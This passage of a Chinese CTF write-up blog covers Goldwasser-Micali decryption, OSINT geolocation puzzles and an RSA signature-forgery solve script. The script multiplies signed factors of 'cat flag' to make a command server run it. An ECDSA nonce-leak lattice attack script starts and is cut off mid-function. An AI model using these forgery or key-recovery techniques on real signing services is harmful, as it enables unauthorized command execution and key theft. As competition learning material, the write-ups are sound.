class="number">35920729037346907063152399926080706264554331849560440381191227037937910244659464632447084476697840313861056020706495596126485303699013742182912707172975</span>, <span class="number">70315041903670157336851359766913844259670523706324294379204277248685999742047453561977925733597786796424146533733873673211660303409007875211743693703450</span>, <span class="number">39300531126860319955398345847761010603834225325535364925973189673883589019704883130648163179767141337507300067661030698253528221916592525918624340607537</span>, <span class="number">15496845894895615630021254140566466646250515307806313944390059489493636414202320808813409873352911875321240477276777125460299625425443517127346136060402</span>, <span class="number">6918931991334214049432302933214038877664252698312543806498810568265540530745938020106356587006559879317556154131091801485516823150639771462068552490458</span>, <span class="number">13284319826136226129231185037901985819553434334436034136363422696599972727231112997735289148332196516271619405264890626985179077260440615779761000533675</span>, <span class="number">47141354451986229521055621338816842478003758611988390046169176610982917702117914199406800715608779829266151978859414114993007913651989935003014956276172</span>, <span class="number">62006071231519162075067533854248673825540723340885150250907087023728863043449786611822047715700318722376817127112362733271740625676783440798426908449101</span>, <span class="number">63893521915695074076473015870298955838191664815517808757499000857893428891197252747360448837407785054229725838898014349928665255821170162098307539344307</span>, <span class="number">53724997828497244329408633732485843721280646497077186636538276560039817034467049143979659252524650609122526779152238242200009648428459318191364710668758</span>, <span class="number">59560026843867449601276263740933112576182129239752897447857785482266968806850863675639974741623809306675891510190099978299125663568621065833548636364530</span>, <span class="number">40908904103345585788262408080445592912077785202466130402193215696781356453887694866479723318713262095397682184771025397015406424244516593134998423540293</span>, <span class="number">21520846393831470685610096190168502256530920634386412660925756889910811879936477244071180593183278964080595838026896057947192168361175044065775753001472</span>, <span class="number">71994121934100897695373777005150806654834175335935905432800180220212844161938577456202364343367762384804519329089155317640274999082541777992495590496300</span>, <span class="number">59953753983754938792876611451670073996692753691715543251991783347838397186003557839758271745884505324101699352687982352675858568077550526416572161213218</span>, <span class="number">32018619708338154045357870379406367509414130390075786097563998491238705394761106321287493739342215745501191759206980684126857845949108887540197973688400</span>, <span class="number">19753200456167466465779432336842541030557413397596794468519345155114986012441764419115444925556673818310817249150486960437725537702448521078373504867565</span>, <span class="number">7342484858213250235462608889213386080064726860046853081716849206494415366815619844020076108010255128616757216474086252862052951751272920557333252010431</span>, <span class="number">4769896687715967889336481310203290840512712756999532930891000782787932528428270382724343267441239836234899104850512445829826485709802266593256527297538</span>, <span class="number">74355004258607576571833753840053548463378928267424658977196161874473156579212738683557688699040100682847094105589799689843205305201454653584801640872249</span>, <span class="number">6690892016551814532110082014788257179806167058472941857479165541743120455147037200870473223869330191373716321809815790713607069279076031653761661498152</span>, <span class="number">20929231349749029774507043474913656384295114733554322493333103320239789344142773690393384176681858129568549611334486303260091934120991115068065757099304</span>, <span class="number">17153283710807583417797086518064762512344132499163280505223698478090291002458606163847203257279411593037898263419480619904785414327965511942845045917778</span>, <span class="number">22050651142736213565244963818664170172032916896662073301155387192243089695489247087391670138735276225579775431936391388626697441900275744645141428022189</span>, <span class="number">50937819965132153811444565518964927860475724053299129557722050639198908074429589460667005191838429306196635373570825296681353003427220426130286971585939</span>, <span class="number">58913284462604187700172393158100310168635473835280983484905632522707627578956876728290392755044023467406825316230706821238436272638921714237556770859104</span>, <span class="number">17681890152946896225972804441881107507903984131878871289374213139906663030958773969339053682624067346901991714169068086996858271362082589139087115054292</span>, <span class="number">3909112468307243293324758000901176555871642123266849529594698077998545905775916220352604577315589652297068228906040474063596051918710761329690286227933</span>, <span class="number">26659357996912432362440742895222637274276390173496378252980802667664532931418023547469963558051869368670035728144595039473629042831713113176157537965085</span>, <span class="number">17179226767528485522234897181377818519983080414340110997618943993801738768695017677485273725010927951188829959293549597122347814093251802798150160484484</span>, <span class="number">19844433737083054737496998287597016986512276379827687999223100265664593048556212270024309974344283154237055912105437530884588065558856906602096195808242</span>, <span class="number">47348710551114046556019331306794334756808275356761888394461758029243482669094351826152778467123320068123601738366945029608823621120671776870709906375117</span>, <span class="number">9700117555541147957162539236799929299304670997996359585230076707723964209982089821563932293396563832179879999190357045199347391324979469059773776588627</span>, <span class="number">13467002873626636888949523271031927213159346608965094817646302401288661282610791478079736771259321566155237819209065435898148651759189622569101507485715</span>, <span class="number">63037961235817497070200076262785758477371602688561664152916441494722106004437031909053699035623597319059285567182742183641167584128065475289227729777632</span>, <span class="number">64218176089111895416869027246603819970664313506455920488148791215602497569336950361142384744880154632841827794749450034276833675991153288511197242689683</span>, <span class="number">47942263513439392830167504616104953960109996199015457630131745546068423701013642403323839156160826426619128873229034532556824671458723559069019818844664</span>, <span class="number">68742746222182563249219749720388662956433689017106697510006439927726538907944533506432387677351240369908865156490610628224604208935896518456792275951386</span>, <span class="number">52212644024277302202964993748543423030284246877586585223549426038195599560460361521694871178577347471545868137719848759593471592105056983977953734420504</span>, <span class="number">70264906652847626089535377366020042773837334827875270446429461263902560176829906570391678559378185295380703037786129287917380381287801134465465850277689</span>, <span class="number">70338735306991917918870792762895693400859231411804513011341248280823069527131025167916532212139891844804984508688078627963308722454289725189496741592783</span>, <span class="number">11202943024812091871968653090774694646166527588230230055019610642288376456094708642854597051283662781541220199344624011347563372208585467149576852176942</span>, <span class="number">45465287772079811194403031363838060966264660784435391586286323915162071710978408348641606715517047525841527692603591534466833484617776719296902254451809</span>, <span class="number">15169623996435078849216247400427343363968733516560810866651811037320678250903315110528158438221622688297331087485255287010416118126711779737721856328337</span>, <span class="number">28852475740061878372356478463808810042887244041514447822647154314012875742232208435189321135142249111535515768003337785061252044994754401654492928310569</span>, <span class="number">5964830405726355845868918682783030011195532635722675073707557787272120274893377363927170466481373691893436275201727030031846950955144759398184269785791</span>, <span class="number">34240000270864477532075102450968450839470355528222720094068701617005525747220229570079432765968261626445996576859553932062082807188947122110205121541573</span>, <span class="number">36066847009381278750262267643160682991490266290788266279454640758898653971700345576937422987472907571638424055138191448503121311206068403152358903727931</span>, <span class="number">11170091007234975852711136174576640764201643584673042209824904622333149479149743689621256091273212460852711241325787976935346940110932656520985022456280</span>, <span class="number">58258126945548764950797717782798700624779811959209396814323548509396126011391646953885580742437208484260400477925904686859314497837461751795642440123737</span>, <span class="number">19967926920673152856540078688569687894710262985783180877581399859282901459026334508029201347173518578230966148855216358303416030336039471203130056025847</span>, <span class="number">23595548276608645278366664833783341231551328905679099443768564892841143279319379101358803895431983463285466294746298308657854039318187145804362431897564</span>, <span class="number">2893474370961335486456525824174663168081310809497129676211358076233834398745859402822323873444488074719052580697214253881106450534065425461738291869558</span>, <span class="number">5958907829034425034060316070647535655459615550109982419322554756251664155034664518669276533235954875314578002477545778915463022354241496629192604779196</span>, <span class="number">27788566883685737903481747231933802166299928088919432671260904020088637407292302594730412087020004041723078159004193447947542516090218561430792231480922</span>, <span class="number">20532093112179185521013377866112742417812622082022290708449532178388359732865119787523382224112648787182208662206608003197496180647105678758158192400715</span>, <span class="number">53650577218203110600410729325998398766865814136267255360061172788801435890073996725463408842308335996720339673250282900111659334006005865543492882410994</span>, <span class="number">27945606735686322555814229684881151888663150442470178076013292048060839982203053567640973752973606459118462199368045579874974993094749585683152306114353</span>, <span class="number">7830111257927859573531774147894277110055421603464794311873488150838576658890506727221887391800809154699966290549716428882127868574637820957455771454946</span>, <span class="number">25025808677568131096842775102792540807686366181393166426022508716670220871341079639434019763537052343485081027257058743353860070591961282205809544500182</span>, <span class="number">5727554508299281734853143508379520041502848342636591640239397030993361937011007794354012913783223878938187192585041630893973877566528148234547516190549</span>, <span class="number">34125297955221973416857421179727086657998910466291260285578023763300602193457505573438526997539188005416829176125101756371491215872928342534317152560632</span>, <span class="number">32748794215539175827451064809169640707872656691637312790248785369034804895807371648792467471366168858175551862032815723885968389112394766296982682443669</span>, <span class="number">19316062337601046084359756740917069089224659580679757830844402882574641776835008814717493659219551992308545704093654161563862554123430967564362043544475</span>, <span class="number">16698150154757920977809280429499684949586664950572392192530208431996083807110717281687762672769576510155761079366746466550237192996169124113339334886230</span>, <span class="number">44572056955848609010373092439149356067260311771322096152721745227413956103682879244155534554941522431647827072846297085468860260003046353502705163208246</span>, <span class="number">27628575438344418993708339803452443890754069104828236665940305554239599902121186251891130374253429078333471004275298197440209461188118994332259999120164</span>, <span class="number">61919652562044972586438492785212427980643594673222454260723387039610192124396273187701658792233976764341751602543127060384407044689376048608848519817966</span>, <span class="number">46109764189688329101004508471171450628496264955374314980452086114935940284534425097345137553792317990951285615961627798248025371385228530104733124807466</span>, <span class="number">46817387909791035117400619877531601085593430973492709899023738884533565717056702943707383750398878694854456668238661907490893742791290178958747041681661</span>, <span class="number">59056224920609792204565568830061390745355488565348333616939229708289518825178885105132973296275188941665728400536826108349556934037483523802869792969716</span>, <span class="number">66604984921500741665478926723143420146438008068509389500728173853359052714091540238730324836724525809382581628360434354102848448924156047215001921555337</span>, <span class="number">31419582430779462840265313481263250807512794931203141071416250525469576085849479844947749880276719895647109269316672096266294357898786379072006529876864</span>, <span class="number">39183832730973061755201647330753616948134226115790320443363338294219451770753694348259167324654888119971382851094286357667963928230844906403886283289603</span>, <span class="number">3283255784320516413168899839829830028094602407822730101434806505467144706365783146560674309642101764920423301535255518747699612103072011492758793346946</span>, <span class="number">33368835974991525266725023131287562136839356113213003074639977323208007298803414289567135487257122997245456354564103035169531096968774429702946303497005</span>, <span class="number">69846025000402574364962470590372113840860535424086059210489025038699977139863035493677207474408680292062773766558077221180073317914557709977751070278701</span>, <span class="number">34224232632002355134365134629936005598177140616238858498314305970780852215452788902032135977405618831573456053924472889839514221495216331158722016210045</span>, <span class="number">65658980938469147193290995330802413952882415964793941700703938082218727023573782508973634540422819521500781964327919480012170455893980979452781727496450</span>, <span class="number">9665250348154536654206530131694515665172789483002642996612304591358982054881243090223340150894464762416439064809966191601896552757074713738589101038945</span>, <span class="number">8284215764601217981544785999422488229859061814390197195042613376491836774363916339272149964393696441572819237956327108891284365148450554717902579008885</span>, <span class="number">53839210761275384122812678155375624236213180995083637849090835596108532323779151952329262056317064448003166882964978836017773003455831766519615849734309</span>, <span class="number">8879066950085937295713426375145168962599389613745881844691288681084047755219605949515654929255916456463715160675759365433899307173061948451396093081300</span>, <span class="number">44846522954890932053452170548384737961090700275209642378685662035957105157761437451596217747093401844478988631729230318383327981353712362273424303455125</span>, <span class="number">43158163002980268176859470096906775042752252325756903267533186654149503438997066932081638361997913554233587761452222246607235427619695339583560854453989</span>, <span class="number">52573321691121279494123052995574692408510998007843795734096932344446198410817800561173257074232286807684589742033894643046244979672762218377487299434722</span>, <span class="number">7897550374384904887513967113216775000773764113952765407625043995683474308691357357102548770113514399030757334911738320038416173083084558400152128218597</span>, <span class="number">16715592176910978920444709654700402674087729403854503083620096481591569067609291105780994401753704255670785725498133269560763193450380953726654434098377</span>, <span class="number">13997295715451071253747239124428639199617619156231247326729836233417198543504118262938847989649348778500848314555687607052915438695191930013893628900615</span>, <span class="number">47229599794488613098124056349473823155280392998354765758670868622165063315177232324540165316843226647506443608478789352548001630604076040168618807914792</span>, <span class="number">35258213694320046701654200010884312588312321572105544777004280046591344354420706119915893205430664500593588418655204102873984500148524518893396701626955</span>]</span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">n = N</span><br><span class="line"><span class="keyword">for</span> cipher <span class="keyword">in</span> ct:</span><br><span class="line">    <span class="keyword">if</span> gmpy2.jacobi(cipher, n) == -<span class="number">1</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(plaintext, <span class="number">2</span>)))</span><br></pre></td></tr></table></figure>

<p>所谓的同态加密，简单介绍下，从la佬学习过来</p>
<ul>
<li><p>密钥生成</p>
<p>和RSA一样，先选取两个大素数p和q，N=pq，z是N的二次非剩余中的一个随机数</p>
<p>pk=(N, z)，sk=(p, q)</p>
<p>何为<strong>二次非剩余</strong></p>
<ul>
<li>当存在某个X，$X^2\equiv d\ (mod\ p)$成立，称d是模p的二次剩余</li>
<li>当对任意的X，$X^2\equiv d\ (mod\ p)$不成立，称d是模p的二次非剩余</li>
</ul>
</li>
<li><p>加密</p>
<p>明文空间是{0, 1}</p>
<p>对于明文m，从取随机数$r\in \mathbb{Z}^*_N$，$c=r^2z^m\ mod\ n$</p>
</li>
<li><p>解密</p>
<p>对于密文c，如果c是模n的二次剩余，则m=0，否则为1</p>
</li>
</ul>
<p>为什么安全呢，从la佬拉来的话</p>
<p>GM加密系统的安全性是基于模n的二次剩余问题。对于私钥的拥有者，知道大整数n的因子分解，求解模n的二次剩余问题是容易的；而对于攻击者，无法获知n的因子分解，求解模n的二次剩余问题是困难的，继而保证了该加密方案的安全性</p>
<p>虽然我连n都分解不了，但是用雅克比可以做出来，雅克比是啥，后续补充</p>
<h1 id="Really-Awesome-CTF"><a href="#Really-Awesome-CTF" class="headerlink" title="Really Awesome CTF"></a>Really Awesome CTF</h1><p>没有密码学，又要被饿死了；所以手空看了下别方向的题目</p>
<p>OSINT(Open source intelligence)，公开来源情报，社工类的题目。这里有几题就是给一张照片，然后根据图上的信息，在比赛方提供的小地图上标出该照片拍摄的位置，应该要求精确度挺高的</p>
<h2 id="OSINT-Triangles"><a href="#OSINT-Triangles" class="headerlink" title="OSINT-Triangles"></a>OSINT-Triangles</h2><p><img data-src="https://files-2021.ractf.co.uk/challenge-files/25/e206b85e2467a1d7dda65e4954da58b1/triangles.jpg" alt="https://files-2021.ractf.co.uk/challenge-files/25/e206b85e2467a1d7dda65e4954da58b1/triangles.jpg"></p>
<p>主要的信息是一个广告牌和指路牌，首先定位是意大利的拉古萨，然后根据指路牌上的一些景点的名字找到</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210816171347485.png" alt="Triangles"></p>
<h2 id="OSINT-Skyline（unsolved）"><a href="#OSINT-Skyline（unsolved）" class="headerlink" title="OSINT-Skyline（unsolved）"></a>OSINT-Skyline（unsolved）</h2><p><img data-src="https://files-2021.ractf.co.uk/challenge-files/26/360e01f9a6f43edfa5c83f0913e3653c/skyline.jpg" alt="Skyline"></p>
<p>没有文字信息有点难</p>
<p>好嘛，我按照wiki百科上所有的摩天轮列表依次找过去都无果，wiki百科上的应该也不完整</p>
<h2 id="OSINT-Silver-Darlings"><a href="#OSINT-Silver-Darlings" class="headerlink" title="OSINT-Silver Darlings"></a>OSINT-Silver Darlings</h2><p><img data-src="https://files-2021.ractf.co.uk/challenge-files/27/75b07a854ad678ce338f2ba0c384b913/silver_darlings.jpg" alt="Silver Darlings"></p>
<p>这道题有文字信息啊，而且是家知名的宾馆之类的吧，提取照片中的<code>Cafe de la Mairie</code>还有<code>Chambre dhôtes</code>等字样就能直接用搜索引擎搜到，位于法国</p>
<p>是不是都在欧洲啊</p>
<h2 id="OSINT-John-Poet"><a href="#OSINT-John-Poet" class="headerlink" title="OSINT-John Poet"></a>OSINT-John Poet</h2><p><img data-src="https://files-2021.ractf.co.uk/challenge-files/28/8209b216341b2ed208d10e8dc941d6fe/john_poet.jpg" alt="John Poet"></p>
<p>主要抓住R.H.C.（这不是红帽杯吗哈哈哈哈），一开始还以为是香水店，最后发现是酒店<code>Rail House Café</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210818133239653.png" alt="image-20210818133239653"></p>
<h2 id="OSINT-50m-on-the-Right（recuring）"><a href="#OSINT-50m-on-the-Right（recuring）" class="headerlink" title="OSINT-50m on the Right（recuring）"></a>OSINT-50m on the Right（recuring）</h2><p><img data-src="https://files-2021.ractf.co.uk/challenge-files/29/397b6b0a8d0d97fc25ff57c3ce082de6/50m_on_the_right.jpg" alt="50m on the Right"></p>
<p>翻译了几乎所有的文字的，但是搜索无果</p>
<p>先来看广告牌上的信息</p>
<ul>
<li><code>Bistrô</code>是葡萄牙语小酒馆的意思，并不是特定的店名</li>
<li>紧接着的两句话，上面一句是葡萄牙语<code>Cozinhar com Estilo,Saborear com Prazer</code>，在线翻译是<code>烹饪风格,愉快地品尝</code>，也对应下面英文的解释</li>
<li>接下来两个模块的字有点重影看不清</li>
<li>左下角是三个葡萄牙的电视：<code>sport tv,enfica tv,eleven sports</code></li>
<li>右下角好像是地图一样的东西，难道是临海的意思？</li>
</ul>
<p>然后再来看交通指示牌上面混合用着西班牙语，葡萄牙语以及加利西亚语，应该是某些禁止的意思，但没什么用</p>
<p>看到车牌<code>56-UZ-11</code>，查了一下葡萄牙的车牌符合此格式</p>
<p>所以综上应该是葡萄牙或者是葡萄牙上面的西班牙的加利西亚自治区</p>
<p>然后就没有然后了</p>
<p>评论区师傅提醒我了，竟然直接搜<code>葡萄牙 bistro 24</code>就有，这家餐馆的名字确实是叫<code>bistro 24</code>；当初我还以为是24小时营业的意思，还是不能放过细节。也确实该地在葡萄牙沿海</p>
<p>社工类题目的做法还得多训练下</p>
<h1 id="SSTF"><a href="#SSTF" class="headerlink" title="SSTF"></a>SSTF</h1><h2 id="Crypto-RSA101"><a href="#Crypto-RSA101" class="headerlink" title="Crypto-RSA101"></a>Crypto-RSA101</h2><p>开胃菜题，不会有<a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7!2256&authkey=!ANLCkvPBdXSb8Ko&em=2">tutorial</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nc rsa101.sstf.site 1104</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"></span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[RSA parameters]&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, <span class="built_in">hex</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, <span class="built_in">hex</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">msg</span>):</span></span><br><span class="line">	m = bytes_to_long(msg)</span><br><span class="line">	s = <span class="built_in">pow</span>(m, d, n)</span><br><span class="line">	<span class="keyword">return</span> long_to_bytes(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">s</span>):</span></span><br><span class="line">	s = bytes_to_long(s)</span><br><span class="line">	v = <span class="built_in">pow</span>(s, e, n)</span><br><span class="line">	<span class="keyword">return</span> long_to_bytes(v)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">welcome</span>():</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\nWelcome to command signer/executor.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Menu : 1. Verify and run the signed command&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;       2. Generate a signed command&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;       3. Base64 encoder&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;       4. Exit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	welcome()</span><br><span class="line">	sel = <span class="built_in">input</span>(<span class="string">&quot; &gt; &quot;</span>).strip()</span><br><span class="line">	<span class="keyword">if</span> sel == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">		sgn = <span class="built_in">input</span>(<span class="string">&quot;Signed command: &quot;</span>).strip()</span><br><span class="line">		sgn = b64decode(sgn)</span><br><span class="line">		cmd = verify(sgn)</span><br><span class="line"></span><br><span class="line">		commands = [<span class="string">&quot;ls -l&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;id&quot;</span>, <span class="string">&quot;cat flag&quot;</span>]</span><br><span class="line">		<span class="keyword">if</span> cmd.decode() <span class="keyword">in</span> commands:</span><br><span class="line">			system(cmd)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Possible commands: &quot;</span>, commands)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> sel == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">		cmd = <span class="built_in">input</span>(<span class="string">&quot;Base64 encoded command to sign: &quot;</span>)</span><br><span class="line">		cmd = b64decode(cmd)</span><br><span class="line">		<span class="keyword">if</span> cmd == <span class="string">b&quot;cat flag&quot;</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;It&#x27;s forbidden.&quot;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Signed command:&quot;</span>, b64encode(sign(cmd)).decode())</span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> sel == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">		cmd = <span class="built_in">input</span>(<span class="string">&quot;String to encode: &quot;</span>).strip().encode()</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Base64 encoded string:&quot;</span>, b64encode(cmd).decode())</span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> sel == <span class="string">&quot;4&quot;</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;bye.&quot;</span>)</span><br><span class="line">		exit()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Invalid selection.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>大致意思是要用d给<code>cat flag</code>的字节流进行加密才能真正获得flag，这个过程相当于用RSA签名；但是<code>cat flag</code>被滤过，有web那味儿了</p>
<p>虽然可以获得用同一个d签名后的<code>ls -l</code>，<code>pwd</code>，<code>id</code>，但仔细一想并不能构成什么攻击，我的解释是因为虽然有过了一段时间就换密钥的说法，但是才3次应该还不构成攻击；这条路行不通</p>
<p>不知道有没有命令行的绕过方法，比如用<code>;</code>之类的</p>
<p>瞄了一眼提示哦，好；既然另外三个没什么软用，直接从<code>cat flag</code>下手，易得<code>bytes_to_long(b&#39;cat flag&#39;)=7161132565001953639=103 * 408479 * 170205956447</code>，全部不行就一个一个来，最后因为遵从<br>$$<br>m^d\equiv (m_1m_2m_3)^d\equiv (m_1^d\ mod\ n)(m_2^d\ mod\ n)(m_3^d\ mod\ n)\equiv c\ (mod\ n)<br>$$<br>就可以成功在最后拼凑成<code>cat flag</code>，并执行</p>
<p>这个没想到需要好好反思下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nc rsa101.sstf.site 1104.</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;rsa101.sstf.site&#x27;</span>, <span class="number">1104</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;n =&#x27;</span>)</span><br><span class="line">n = <span class="built_in">int</span>(sh.recvline().decode()[<span class="number">3</span>:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">cf = <span class="string">b&#x27;cat flag&#x27;</span></span><br><span class="line">cf = bytes_to_long(cf)</span><br><span class="line">d = factor(cf)</span><br><span class="line">mi = []</span><br><span class="line">m = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(d)):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Base64 encoded command to sign:&#x27;</span>)</span><br><span class="line">    sh.sendline(b64encode(long_to_bytes(d[i][<span class="number">0</span>])))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Signed command:&#x27;</span>)</span><br><span class="line">    mi.append(sh.recvline())</span><br><span class="line">    m *= bytes_to_long(b64decode(mi[i]))</span><br><span class="line"></span><br><span class="line">m = m % n</span><br><span class="line"><span class="comment"># sh.recvuntil(b&#x27;v&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Signed command:&#x27;</span>)</span><br><span class="line">sh.sendline(b64encode(long_to_bytes(m)))</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-RCfour"><a href="#Crypto-RCfour" class="headerlink" title="Crypto-RCfour"></a>Crypto-RCfour</h2><p>kw人家把网站关掉了，都怪我太拖延</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>OSINT</tag>
      </tags>
  </entry>
  <entry>
    <title>20211113 L3HCTF</title>
    <url>/posts/90e286aa/</url>
    <content><![CDATA[<p>两题只出一题，还行，jio本小子</p>
<p>第二道用R语言写的，什么时候学下</p>
<span id="more"></span>

<h1 id="L3HCTF"><a href="#L3HCTF" class="headerlink" title="L3HCTF"></a>L3HCTF</h1><h2 id="EzECDSA"><a href="#EzECDSA" class="headerlink" title="EzECDSA"></a>EzECDSA</h2><p>好多知识要恶补。题目意思比较简单了，ECDSA椭圆曲线签名，而且知道100个nonce的低8位</p>
<p>看la佬的博客上上面有篇<a href="https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/">链接</a>指向的文章说，泄漏每个nonce的低位就可以攻击ECDSA</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211113152712752.png" alt="image-20211113152712752"></p>
<p>看不懂论文，所以只能在github上疯狂搜代码，终于找到了这位师傅的</p>
<p><a href="https://github.com/bitlogik/lattice-attack">https://github.com/bitlogik/lattice-attack</a></p>
<p>这个师傅是通过json传递数据，稍微改一下就好，bitlogik师傅的代码要用sage运行，用到了fpylll，提供LLL，BKZ等矩阵运算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"></span><br><span class="line">table = ascii_letters + digits</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solve</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># self.sh = remote(&#x27;127.0.0.1&#x27;, 23333)</span></span><br><span class="line">        self.sh = remote(<span class="string">&#x27;121.36.197.254&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        self.pk = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        self.dA = <span class="number">0</span></span><br><span class="line">        self.r, self.s, self.kp, self.<span class="built_in">hash</span> = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># sha256(XXXX+EiHCHlPjoO2PnV2Z) == c4f17d1f76f7f11f75349dcd84f51b6e615aa756271841558ec8dda57e274959</span></span><br><span class="line">        <span class="comment"># Give me X<span class="doctag">XXX:</span></span></span><br><span class="line">        proof = self.sh.recvuntil(<span class="string">b&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">        tail = proof[<span class="number">12</span>:<span class="number">28</span>].decode()</span><br><span class="line">        _<span class="built_in">hash</span> = proof[<span class="number">33</span>:<span class="number">97</span>].decode()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> product(table, repeat=<span class="number">4</span>):</span><br><span class="line">            head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">            t = sha256((head + tail).encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> t == _<span class="built_in">hash</span>:</span><br><span class="line">                self.sh.sendline(head.encode())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve_param</span>(<span 